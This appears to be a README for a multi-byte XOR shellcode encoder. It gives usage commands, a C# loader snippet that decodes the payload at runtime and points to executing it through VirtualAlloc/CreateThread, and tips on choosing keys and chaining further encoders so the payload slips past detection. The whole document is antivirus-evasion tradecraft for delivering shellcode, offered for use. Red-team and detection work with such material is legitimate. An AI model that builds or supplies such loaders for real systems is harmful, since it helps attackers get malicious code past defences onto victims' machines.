# Multi-Byte XOR Encoder

Encodes shellcode with a multi-byte XOR key (e.g. `0xDEADBEEF`). More resistant to pattern analysis than single-byte XOR because the key pattern repeats every N bytes instead of every byte.

---

## Usage

```bash
# Encode shellcode — output C# byte array
python3 multibyte-xor.py encode shell.bin DEADBEEF

# Encode with Python output (for testing)
python3 multibyte-xor.py encode shell.bin DEADBEEF --format py
```

---

## In a C# loader

The script outputs two things:
1. The encoded byte array
2. The one-liner decoder

```csharp
// Encoded shellcode from encoder:
byte[] buf = new byte[N] {
    0x12, 0x34, ...
};

// Decode at runtime:
byte[] key = new byte[] { 0xDE, 0xAD, 0xBE, 0xEF };
for (int i = 0; i < buf.Length; i++) buf[i] ^= key[i % key.Length];

// Then execute buf as shellcode via VirtualAlloc/CreateThread
```

---

## Why multi-byte over single-byte

| | Single-byte XOR | Multi-byte XOR |
|--|----------------|----------------|
| Key length | 1 byte | 2-16+ bytes |
| Key space to brute-force | 256 | 256^N |
| Pattern repeat | Every byte | Every N bytes |
| Defeats known-key scan | No | No (key must be guessed) |
| Detection risk | Medium | Lower |

Use 4-byte keys minimum. 8-byte keys are better. Avoid keys that create obvious patterns (all 0x00, 0xFF, or incrementing).

---

## Combining with other encoders

```bash
# XOR encode first
python3 multibyte-xor.py encode shell.bin DEADBEEF > xored.py

# Then pass through IPv4 encoder for further obfuscation
# (manual: extract bytes from xored.py, write to binary, run ipv4-encoder.py)
```
